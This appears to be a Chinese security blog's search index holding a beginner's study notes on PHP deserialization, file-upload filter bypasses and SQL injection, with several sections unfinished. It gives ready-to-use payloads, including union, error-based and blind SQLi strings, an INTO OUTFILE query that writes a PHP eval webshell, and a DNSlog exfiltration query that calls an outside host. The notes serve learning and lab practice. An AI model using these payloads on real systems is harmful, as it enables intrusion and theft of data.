<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PHP反序列化部分知识点</title>
      <link href="/Mash1r0/1.html"/>
      <url>/Mash1r0/1.html</url>
      
        <content type="html"><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>一个预定义好的，在特定情况下自动触发的行为方法。</p><p>反序列化过程中，unserialize()接受的值（字符串）可控；通过更改这个值（字符串），得到所需要的代码；通过调用魔术方法，触发代码的执行。</p><h4 id="1-construct"><a href="#1-construct" class="headerlink" title="1.__construct()"></a>1.__construct()</h4><p>构造函数，在实例化一个对象的时候，首先会去自动执行的一个方法。</p><p>在实例化时触发它。</p><h4 id="2-destruct"><a href="#2-destruct" class="headerlink" title="2.__destruct()"></a>2.__destruct()</h4><p>析构函数，在对象的所有引用被删除或者当对象被显示销毁时执行的魔术方法。</p><p>实例化对象结束后，代码运行完全销毁会触发。</p><p>在序列化过程中不会触发。</p><p>在反序列化过程中触发，反序列化得到的对象，用完后会销毁，触发它。</p><h4 id="3-sleep"><a href="#3-sleep" class="headerlink" title="3.__sleep()"></a>3.__sleep()</h4><p>序列化之前会触发。</p><p>此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。</p><p>如果该方法未返回任何内容，则NULL被序列化，并产生一个E_NOTICE级别的错误。</p><p>它需要参数，参数为成员属性。</p><p>最后会返回需要被序列化存储的成员属性。</p><h4 id="4-wakeup"><a href="#4-wakeup" class="headerlink" title="4.__wakeup()"></a>4.__wakeup()</h4><p>反序列化之前会触发。</p><p>反序列化之前会检查是否存在这个魔术方法，如果存在，则会先调用，预先准备对象需要的资源，返回void。</p><p>常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p><h4 id="5-toString"><a href="#5-toString" class="headerlink" title="5.__toString()"></a>5.__toString()</h4><p>把对象当成字符串调用时，会触发。</p><p>例如我们去echo字符串时，echo ‘string’，如果里面是个对象就会触发这个魔术方法。</p><p>调用对象可以使用print_r或者var_dump。</p><p>echo和print会导致对象被当作为字符串使用。</p><h4 id="6-invoke"><a href="#6-invoke" class="headerlink" title="6.__invoke()"></a>6.__invoke()</h4><p>把对象当成函数调用。</p><p>例如有一个   <strong>function abc(){}</strong>    和一个对象  <strong>$test</strong></p><p>我们   <strong>abc();</strong>   会调用这个函数，同理如果我们去写成   <strong>$test();</strong>   就相当于把对象当做函数来用，就会触发这个魔术方法。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传部分知识点</title>
      <link href="/Mash1r0/fb7b82f0.html"/>
      <url>/Mash1r0/fb7b82f0.html</url>
      
        <content type="html"><![CDATA[<h2 id="文件上传漏洞笔记"><a href="#文件上传漏洞笔记" class="headerlink" title="文件上传漏洞笔记"></a>文件上传漏洞笔记</h2><p>**1.**如果通过js过滤，可以考虑在浏览器中禁用js直接上传。</p><p>**2.**可以通过修改content-type进行绕过，如果在后端过滤，可以上传.php然后抓包修改content-type或者是上传.jpg（白名单上面的类型）抓包修改文件为.php，在前端的话就需要先上传白名单类型。</p><p>**3.**特殊后缀绕过，可以在配置文件中修改httpd-conf（Apache）文件。</p><p>找到解析php的语句（AddType application&#x2F;x-httpd-php）在后面加上想要被解析成php的文件类型（如加上.php3，则会有.php3的文件被解析为.php文件）</p><p>**4. **特殊后缀绕过另一种，采用.htaccess（注：不要带名称，为“.htaccess”，Apache）。</p><p>解释：与httpd-conf类似同样为配置文件，但是一个是全局，一个是局部（对当前目录以及子目录生效），当存在.htaccess文件时优先使用此配置文件（类比为全局变量与局部变量）。</p><p>找个空白记事本可以写上解析php的语句除了第3点写法，还有如下：</p><p>&lt;FilesMatch “1.jpg”&gt;<br>   SetHandler application&#x2F;x-httpd-php<br></FilesMatch></p><p>可以指定文件范围类的1.jpg文件解析为.php文件。</p><p>如果不行可能存在.htaccess未开启，需要在httpd-conf文件里面找到AllowOverride语句将后面的none改为ALL。</p><p>**5.**httpd-conf文件需要重启服务器后生效，.htaccess文件修改后立即生效。</p><p>httpd-conf作用：包含Apache HTTP 服务器的全局行为和默认设置。</p><p>.htaccess作用：分布式配置文件，一般用于URL重写、认证、访问控制等。</p><p>**6.**php版本可能会导致一些upload-labs失败的问题。</p><p>**7.**Windows系统类的绕过，如：加点、加空格、大写、加点加空格加点（叠加类）。</p><p>利用原理：在修改文件后缀的时候，像上面的例子系统会自动处理掉，自动删除点、空格、转变小写。</p><p>当过滤不够严格，存在此类漏洞时，可以抓包按照以上修改，虽然会显示（.php. .）但是保存的文件是.php。</p><p>针对于这个漏洞需要注意源码最后连接的是哪一部分。</p><img src="C:\Users\21396\AppData\Roaming\Typora\typora-user-images\image-20231130191650472.png" alt="image-20231130191650472"  /><p><img src="C:\Users\21396\AppData\Roaming\Typora\typora-user-images\image-20231130191151923.png" alt="image-20231130191151923"></p><p><img src="C:\Users\21396\AppData\Roaming\Typora\typora-user-images\image-20231130191212137.png" alt="image-20231130191212137"></p><p>可以发现最后连接的有$file_ext和$file_name。而在前面有一个分割函数strrchr()，从点之后进行分割，但不会改变$file_name的值，不过是给$file_ext赋值，在考虑用点过滤时候需要考虑这个连接。</p><p>**8.**php.ini与.user.ini（范围、优先级、生效方式类似于httpd-conf与.htaccess的关系一个是Apache服务器的，一个是php的）。</p><p>.user.ini  作用：特定于用户或特定目录的配置文件，通常位于Web应用程序的根目录下。用于覆盖或追加全局配置文件（如php.ini）中的PHP配置选项。</p><p>php.ini  作用：存储了对整个PHP环境生效的配置选项。通常位于PHP安装目录中。</p><p>.user.ini生效前提：php版本大于5.3.0，最好是7.X版本，ServerAPI（类似于一种协议）为CGI&#x2F;FastCGI（  phpinfo（）查看）有这个说明.user.ini可以生效。</p><p><img src="C:\Users\21396\AppData\Roaming\Typora\typora-user-images\image-20231130102106740.png" alt="image-20231130102106740"></p><p>.user.ini文件上传漏洞前提：可以生效并且上传目录中有php文件。</p><p><strong>9.</strong>  .user.ini绕过，文件包含类型。</p><p>写法如下：</p><p>Auto_prepend_file&#x3D;111.txt(这个文件里面只包含php代码)</p><p>样例：</p><p>A：echo “hello “(.php) b：echo “world”(.txt)   （在upload-labs靶场中文件是存在一个php文件的，只需要写一个auto_prepend_file&#x3D;1.jpg的.user.ini文件再将一句话木马写入1.jpg之后上传就行了)</p><p>Auto_prepend_file&#x3D;b.txt     hello world(在这个目录下，所有php文件在执行之前都会预先包含一下b.txt中的语句)</p><p>**10.**额外数据流。例如“1.txt”是一个文件，而“1.txt::$DATA”是这个文件的一个附加数据流。这样的数据流可以用于存储文件的元数据、备份信息、标签等。</p><p>:$DATA是默认的数据流，可以自己命名（如：1.txt:hello    hello为数据流名称  不要忘记文件名后面的冒号  注意：1.txt:1.txt  冒号后面1.txt就是数据流名称）。</p><p>它类似于某个文件的隐藏属性，像编辑文件后缀是不行的。大多数常规文件操作工具不会意识到这些额外的附加数据流，而只会处理默认的数据流。要访问或操作这些附加数据流，通常需要使用特定的命令行工具或者编程接口。</p><p><em>写入方法（命令行）：</em></p><p>echo “内容” &gt;&gt;文件名:数据流名  （是直接插入内容到数据流）。</p><p>type 文件名 &gt;&gt;文件名:数据流名  （是将某个文件内容插入到数据流）。</p><p><em>查看方法：</em></p><p>notepad 文件名:数据流</p><p><strong>11.</strong>::$DATA绕过，利用了数据流和Windows系统，一个文件的数据流和这个文件是两种类型，但是Windows系统中文件是不存在数据流的形式，如下：</p><p><img src="C:\Users\21396\AppData\Roaming\Typora\typora-user-images\image-20231130102610013.png" alt="image-20231130102610013"></p><p>在抓包修改后得到的是数据流的形式，但其实上传的文件已经由于Windows系统删除字符变成了.php，这时候可以删除后面的::$DATA再次访问并用蚁剑连接。</p><p>**12.**可以通过双写绕过，在一些过滤中会有删除部分都东西，可以采用双写达到绕过目的。</p><p>如：&#x2F;&#x2F;删除::$DATA      则可以用::$D::$DATAATA（保证删除一个::$DATA后能留下来一个就行，因为一般是没有循环删除）。或者是pphphp这种。</p><p><strong>13.</strong>%00(URL编码)与0x00(16进制的00)截断绕过[空字符]。</p><p>%00：主要是针对GET方式，代码审计，如果路径可以操作，可以在URL中修改，例如最后的URL为路径+文件类型，可以在路径后面写上1.php%00将后面截断，从而变成.php改变文件类型。</p><p>0x00：主要是针对POST方式，</p><p><strong>14.</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入部分知识点</title>
      <link href="/Mash1r0/0.html"/>
      <url>/Mash1r0/0.html</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><p>information_schema.tables   information_schema.columns   table_name   column_name   extractvalue() updataxml()   floor()   group by   order by   concat()   limit()   group_concat()   concat_ws()   substring()   mid()   right()   left()   Reverse()   count()   rand()   variables   secure   into outfile   load_file</p><h2 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h2><h5 id="1-判断数字型或者字符型"><a href="#1-判断数字型或者字符型" class="headerlink" title="1.判断数字型或者字符型"></a>1.判断数字型或者字符型</h5><p>可以采用减法的方法，比如id&#x3D;1会有一个回显id&#x3D;2会有另一个回显或者没有回显，我们可以用id&#x3D;2-1去看，如果回显为1的情况，那么这个减法是进行了的，代表为一个数字型的，否则字符型，注意的是这里不能用加法，+可能会被识别为空格（URL编码通常使用+或者%20代替空格）。</p><h5 id="2-判断列数"><a href="#2-判断列数" class="headerlink" title="2.判断列数"></a>2.判断列数</h5><p>因为union的特性前后列数要为一样的，我们用group by 或者order by去判断。以字符型为例，payload一般为</p><p><code>/?id=1&#39; group by 5 --+</code></p><p>(<strong>–+是注释</strong>，把后面的语句注释掉，**#也是注释，但是一般要以%23的形式去表示才行**)，这里就用二分法可以去判断，差不多就是每个试试，如果3不报错，4报错，那么列数就为3，下面所有例子都以列数为3作为例子。</p><h5 id="3-查询数据库名，表名，列名"><a href="#3-查询数据库名，表名，列名" class="headerlink" title="3.查询数据库名，表名，列名"></a>3.查询数据库名，表名，列名</h5><p>我们最后要得到的信息都是在数据库中的某表某列里面，所以我们要逐一查询去得到我们想要的那个。首先对于数据库的话可以用database()，也就是当前的数据库的名称，一般可以用</p><p><code>/?id=0&#39; union select 1,2,database() --+</code></p><p>下面是回显的例子</p><p><img src="C:\Users\21396\AppData\Roaming\Typora\typora-user-images\image-20240321151258641.png" alt="image-20240321151258641"></p><p>我们一般用0或者负数赋值给id这样的参数，是因为一般只回显一行，如果前面的语句执行过了，后面的union联合执行的语句就看不到回显了。</p><p>对于查看表名和列名，我们需要用到系统的一个数据库，这是系统自带的数据库叫information_schema里面包含了tables和columns是所有数据库的表名和列名，我们可以通过这个数据库里面的这两张表添加限制条件获取到我们需要的表名和列名。</p><p>例如以下两个payload</p><p><code>/?id=0&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code>       </p><p>这里的database()可以换为前面查询过得本数据库名，效果是一样的。</p><p><img src="C:\Users\21396\AppData\Roaming\Typora\typora-user-images\image-20240321152347113.png" alt="image-20240321152347113"></p><p><code>/?id=0&#39; union select 1,2,group _concat(column_name) from information_schema.columns where columns=database() *(and table_name=[查询到的表名])*</code> </p><p><strong>括号内可加可不加</strong>，不加限制条件就会显示所有该数据库中的列，加限制条件可以具体到某一个表。</p><p><img src="C:\Users\21396\AppData\Roaming\Typora\typora-user-images\image-20240321152512429.png" alt="image-20240321152512429"></p><p>对于为什么要用group_concat是因为这个函数可以把所有内容回显在一行，例如，你查询表的时候可以不使用这个函数，但你就只能得到一个表，而这个函数可以把所有的内容合并在一起在一行显示出来。</p><p>对于column_name、table_name、schema等，我们可以去</p><p><img src="C:\Users\21396\AppData\Roaming\Typora\typora-user-images\image-20240321152818446.png" alt="image-20240321152818446"></p><p>可以看到在左边第二个就是table_schema，还有中间的column_name也就是限制范围，这些名词都是本身系统设定好的。</p><h5 id="4-获得信息"><a href="#4-获得信息" class="headerlink" title="4.获得信息"></a>4.获得信息</h5><p>像在第三步中我们已经查到了某列为flag，我们就可以直接去用它了</p><p><code>/?id=0&#39; union select 1,2,group_concat(flag) from [flag所在的表] --+</code></p><p>这样就可以得到想要的信息了。</p><h2 id="报错盲注"><a href="#报错盲注" class="headerlink" title="报错盲注"></a>报错盲注</h2><h4 id="盲注：页面没有报错回显，不知道数据库具体返回值的情况下，对数据库中的内容进行猜解，实行SQL注入。"><a href="#盲注：页面没有报错回显，不知道数据库具体返回值的情况下，对数据库中的内容进行猜解，实行SQL注入。" class="headerlink" title="盲注：页面没有报错回显，不知道数据库具体返回值的情况下，对数据库中的内容进行猜解，实行SQL注入。"></a>盲注：页面没有报错回显，不知道数据库具体返回值的情况下，对数据库中的内容进行猜解，实行SQL注入。</h4><h5 id="1-extractvalue"><a href="#1-extractvalue" class="headerlink" title="1.extractvalue()"></a>1.extractvalue()</h5><p>extractvalue(‘XML_document’,’Xpath_string’)<br>extractvalue(‘目标xml文件名’,’xpath格式的字符串’)</p><p>使用这个函数时，它的第二个参数如果格式出现错误，MySQL就会爆出xpath的语法错误xpath synatax，有个<strong>“~”</strong>符号会导致语法错误（ASCII码为0x7e），在第二个参数中存在这个就可以导致报错，我们就可以利用这个去进行报错注入。以下有payload的例子</p><p><code>?id=0&#39; and 1=extractvalue(1,concat(0x7e,(select flag from test_tb))) --+</code></p><p>这是我们一般最后去获得flag的句子，但是你会发现不能显示完全，这也是extractvalue的一个限制，只能显示32个字符串，所以我们要利用截取显示的函数去分步显示，例如**mid()、substr()、substring()**，它们都有三个参数，第一个是字符串，第二个是从第几个字符串开始，第三个是从开始到结束显示多少个。例如：</p><p><code>?id=0&#39; and 1=extractvalue(1,concat(0x7e,(select substr(flag,1,30) from test_tb))) --+</code></p><p>这里用30的原因是方便计算，下一次就是**(flag,31,30)**，虽然只给了最后的语句，中间其实和union注入都是差不多的，以union注入的步骤一步一步来查询到最后需要的flag位置就行了。</p><h5 id="2-updataXml"><a href="#2-updataXml" class="headerlink" title="2.updataXml()"></a>2.updataXml()</h5><p>updatexml(‘XML_document’,’Xpath_string’,’New_value’)<br>updatexml(‘目标xml文件名’,’在xml中查询的字符串’,’替换后的值’)</p><p>这个函数其实与extractvalue的原理类似，它们也都叫做xpath报错注入，也是在xpath_string部分出现语法错误的话就会报错，原理是一致的。唯一区别就是这个函数需要三个参数。</p><h5 id="3-floor"><a href="#3-floor" class="headerlink" title="3.floor()"></a>3.floor()</h5><p>这个函数我们一般要用到count和group by去结合rand()报错。先来讲讲前置知识点。</p><p>首先我们来了解rand()函数，它会随机返回0<del>1之前的随机数，而且带有很多小数；**rand()*2**会改变它的范围，变为0</del>2之间了；如果是<strong>rand() from [某个表]</strong>  假设这个表有2行，那么会进行两次rand计算，也就是会给出两个**rand()<strong>随机值；如果是</strong>rand(0)<strong>，那么会固定不变，就是说给出了一个随机数，但是</strong>rand(0)<strong>已经固定了，rand(1)又会给出另一个随机值，此时</strong>rand(1)**也就是给定了。</p><p>group by 是排序函数，比如有一列数字叫a，一列字符叫b，[需要排列的] group by a 那么就会按照1234去排序，字符就是abcd顺序去排。</p><p>floor()函数即为向下取整函数</p><p>concat_ws()函数是将括号里面的数据用第一个字符连接起来。如concat_ws(<del>,2,3)的结果是：2</del>3。</p><p>count(*)函数作用为统计结果的记录数，这里采用其他师傅的图</p><p><img src="C:\Users\21396\AppData\Roaming\Typora\typora-user-images\image-20240323225437880.png" alt="image-20240323225437880"></p><p>as是命名。</p><p>先给出一般的payload，再解释产生报错的原因</p><p><code>select count(*),concat_ws(&#39;-&#39;,(select flag from test_tb),floor(rand(0)*2)) as xxx from users group by xxx</code></p><p>我们逐个看函数，都是没什么问题的，count去统计concat_ws计算出来的数据，然后group by去排序，group by排序需要键值，比如我们现在有a a b 首先count先去统计，最后得出来了，a:2 b:1 然后group by 会把a,b分别记录为group_key。</p><p>关键点就在于，group by想要记录的concat_ws的数据里面有rand函数，会计算，但是是已经定好了的顺序，例如<strong>floor(rand(0)) from [有5行的表]</strong> 产生的是 0 1 1 0 1，那么第一次计算就是0，再计算一次就是1，group by记录的时候不会直接去复制前面计算过的，所以我们来看的话，第一次计算是0，由于group_key里面没有0所以进行了rand的第二次计算，得到了1，这个1也就存在了key里面，接着进行第三次计算得到了1，key里面有这个1，所以这里没有进行计算，接着第四次计算得到了0，此时key里面没有0所以又要进行一次计算，这是第五次计算为1，结果写进去了1，此时key里面有两个1就报错了。至于为什么会有不报错的情况，是因为第二次记录key时，成功记录到了0，刚刚解释的报错原因就是因为第二次记录key时记录到了1。其实也可以看出，这段记录怎么记录都是个错的，但我们要的只是它的报错。达到了报错的目的，也就能像前面一样进行报错注入了，使用各个语句得到想要的信息。</p><p>在注入过程中，我们一般会用到的有一种如下：</p><p><code>?id=0&#39; union select 1,count(*),concat_ws(&#39;-&#39;,(select group_concat(username,&#39;~&#39;,password) from users),floor(rand(0)*2)) as xxx from information_schema.tables group by xxx --+</code></p><p>这里使用group_concat一般无法显示，可以尝试concat，然后显示也可以用limt 0,1 表示从0开始显示第一行</p><h5 id="4-NAME-CONST"><a href="#4-NAME-CONST" class="headerlink" title="4.NAME_CONST()"></a>4.NAME_CONST()</h5><h5 id="5-jion"><a href="#5-jion" class="headerlink" title="5.jion()"></a>5.jion()</h5><h5 id="6-exp"><a href="#6-exp" class="headerlink" title="6.exp()"></a>6.exp()</h5><h5 id="7-geometryCollection"><a href="#7-geometryCollection" class="headerlink" title="7.geometryCollection()"></a>7.geometryCollection()</h5><h5 id="8-polygon"><a href="#8-polygon" class="headerlink" title="8.polygon()"></a>8.polygon()</h5><h5 id="9-multipoint"><a href="#9-multipoint" class="headerlink" title="9.multipoint()"></a>9.multipoint()</h5><h5 id="10-multilinestring"><a href="#10-multilinestring" class="headerlink" title="10.multilinestring()"></a>10.multilinestring()</h5><h5 id="11-multpolygon"><a href="#11-multpolygon" class="headerlink" title="11.multpolygon()"></a>11.multpolygon()</h5><h5 id="12-linestring"><a href="#12-linestring" class="headerlink" title="12.linestring"></a>12.linestring</h5><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>Web页面，只返回True真，False假两种类型1.利用页面返回不同，逐个猜解数据。</p><p>原理就是利用你写入的语句的真假去判断，一般我们会使用到**ascii()、substr()**函数，利用substr函数，把我们语句得出来的结果把逐个字母都表示出来，例如substr(语句,1,1)，然后对这个字母进行ascii码转换为数字，利用比大小的方式进行判断对错。例如有这样的语句：</p><p><code>?id=1&#39; and ascii(substr((select database()),1,1))&gt;100 --+</code></p><p>如果database()的第一个字母的ascii码值确实大于100，那么页面就会返回True的页面，否则反，也可以利用&gt;&#x3D;这类符号，不断去猜解，最后当然也可以利用等于确定目标，其他语句也是同样的方法，唯一的缺点就是工作量太大。</p><p>以下附有ascii码表</p><p><img src="C:\Users\21396\AppData\Roaming\Typora\typora-user-images\image-20240325112700081.png"></p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>此方法与布尔盲注是类似的，一个是利用页面的真假返回，一个是利用页面的响应时间，不过时间盲注用到的函数多一点点。</p><p>首先我们要了解**if(condition,true,false)**语句，其实和三目运算有点像，或者说是合并的if-else语句，条件为真时返回到第二个，为假到第三个。</p><p>**sleep()**函数，括号里面的值为秒数，可以为小数，即页面回应时间。</p><p>我们对闭合符的判断也可以采用sleep()。</p><p>给出一般的语句：</p><p><code>select if(ascii(substr((select database()),1,1))&gt;100,sleep(0),sleep(5));</code></p><h2 id="注入文件上传"><a href="#注入文件上传" class="headerlink" title="注入文件上传"></a>注入文件上传</h2><p>首先要知道一个语句：<strong>show variables like ‘%secure%’;</strong>  用来查看mysql是否有读写文件权限；</p><p><img src="C:\Users\21396\AppData\Roaming\Typora\typora-user-images\image-20240325121014896.png" alt="image-20240325121014896"></p><p>我们主要是看第三行的secure_file_priv的值，如果是空的话就代表可以读写所有盘的文件，NULL代表不能读取，指定路径就代表只有该路径可以读取。</p><p><strong>into outfile</strong> 命令使用的环境：必须知道一个，服务器上可以写入文件的文件夹的完整路径。</p><p>同样是测试各种数字，字符，列数，闭合方式后我们来写Windows语句：</p><p><code>?id=0&#39; union select 1,2,&quot;&lt;?php @eval($_POST[&#39;password&#39;]); ?&gt;&quot; into outfile &quot;D:\\phpstudy_pro\\WWW\\1.php&quot; --+</code></p><p>注意要双斜杠。页面会报错，但是会执行语句，后面我们可以直接去蚁剑连接进入后台。</p><p>Linux的语句不同于路径一般为**&#x2F;var&#x2F;www&#x2F;html&#x2F;test&#x2F;1.php**</p><h2 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h2><p>也是盲注的一种，但是效率高于时间和布尔盲注。</p><h5 id="1-手动注入"><a href="#1-手动注入" class="headerlink" title="1.手动注入"></a>1.手动注入</h5><p>先来了解**load_file()**函数，它也是一个读取文件的函数，也需要读取权限。</p><p><img src="C:\Users\21396\AppData\Roaming\Typora\typora-user-images\image-20240325203206829.png" alt="image-20240325203206829"></p><p>中间是要一个路径的，我们这里介绍一个UNC路径，也是通过load_file去读取一个网络路径。</p><p>UNC（Universal Naming Convention）：通用命名规则，也称通用命名规范、通用命名约定。UNC 为网络（主要指局域网）上资源的完整 Windows 名称。格式： <code>\\servername\sharename</code> ，其中 servername 是服务器名。sharename 是共享资源的名称。目录或文件的 UNC 名称可以包括共享名称下的目录路径，格式为：<code>\\servername\sharename\directory\filename 。</code></p><p>同时我们要利用DNS服务器去申请一个域名。</p><p>常用网站：</p><p><a href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></p><p><a href="http://ceye.io/(%E9%85%8D%E5%90%88%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%AC)">http://ceye.io/(配合自动注入脚本)</a></p><p><img src="C:\Users\21396\AppData\Roaming\Typora\typora-user-images\image-20240325203855433.png" alt="image-20240325203855433"></p><p>我们通过点击Get SubDomain，DNS服务器会随便给我们分配一个域名。</p><p>我们去访问时，它会做一个记录。</p><p><img src="C:\Users\21396\AppData\Roaming\Typora\typora-user-images\image-20240325203951084.png" alt="image-20240325203951084"></p><p><img src="C:\Users\21396\AppData\Roaming\Typora\typora-user-images\image-20240325204006875.png" alt="image-20240325204006875"></p><p>所以我们可以通过这个记录去达到注入的目的。利用前面的函数去访问这个网络路径，然后去DNS服务器查看访问时的前缀。</p><p><code>and (select load_file(concat(&quot;//&quot;,(selectdatabase()),&quot;.mhjf34.dnslog.cn/1.txt&quot;))) --</code></p><p>写语句的话有几个注意的地方：</p><p>1.为什么用concat是因为语句要用双引号包裹，导致不能执行语句，所以采用连接的办法。</p><p>2.SQL里面UNC的路径用反斜杠”&#x2F;“</p><p>3.域名前面的一个”.”不要忘记</p><p>4.最后要带一个需要访问的文件，不能光是域名。</p><h5 id="2-自动注入"><a href="#2-自动注入" class="headerlink" title="2.自动注入"></a>2.自动注入</h5><h2 id="POST-union注入"><a href="#POST-union注入" class="headerlink" title="POST union注入"></a>POST union注入</h2><p>与前面的union注入大同小异，主要是在POST上面去进行写语句，一般就是在登录框上面去寻找注入点，登录框一般会有三个元素，username，password，submit，这三个参数就是POST方法去提交的。</p><p><strong>username&#x3D;[用户名]&amp;password&#x3D;[密码]&amp;sumbmit&#x3D;Submit</strong></p><p>一般抓包后可以在最后面看到这一行，结合之前的闭合方式的知识，我们可以让它的密码验证消失，比如我们当要登录admin时，只有密码正确了才能进入，但是我们找到它的闭合方式，给它闭合并在密码验证前面添加注释，只要账户名是admin我们就能进去，这也是所谓的万能密码的原理。然后我们可以利用这个进行union注入。例如：</p><p><code>username=1&#39; union select 1,(select database())#&amp;password=[任意值]&amp;submit=Submit</code></p><p>上面记得是在POST上面，还有注意的是，不一定后面是submit为提交。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>电影</title>
      <link href="/movies/index.html"/>
      <url>/movies/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<p>想走渗透方向的安全小白…</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友情链接</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>音乐</title>
      <link href="/music/index.html"/>
      <url>/music/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
